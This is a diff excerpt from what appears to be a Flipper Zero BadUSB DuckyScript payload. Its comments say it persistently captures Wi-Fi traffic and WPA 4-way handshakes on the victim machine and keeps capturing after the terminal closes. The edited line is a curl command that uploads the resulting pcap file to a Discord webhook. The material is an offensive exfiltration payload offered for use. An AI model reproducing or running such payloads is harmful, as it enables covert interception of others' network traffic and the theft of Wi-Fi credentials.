@@ -53,6 +53,6 @@ ENTER
 DELAY 60000
 REM the provided script sequence, the action is intended to work continuously with persistence.  After the script is executed, it captures Wi-Fi traffic for 1 min, sends the captured data to Discord, and continues capture process. We are also using probe request frames as the hexadecimal value so we can later filter the pcap in wireshark for "eapol" see the number of 4 way handshake key sets we have collected.  
 REM Send data to Discord webhook and remember to put in your webhook 
-STRING curl -F "file1=@infinitydump.pcap" https://discord.com/api/webhooks/
+STRING curl -F "file1=@probe_dump.pcap" https://discord.com/api/webhooks/
 ENTER
 REM remember once 100% is reached on the flipper you can unplug and close terminal window the '&' operator captures indefinitely even after the terminal window is closed.
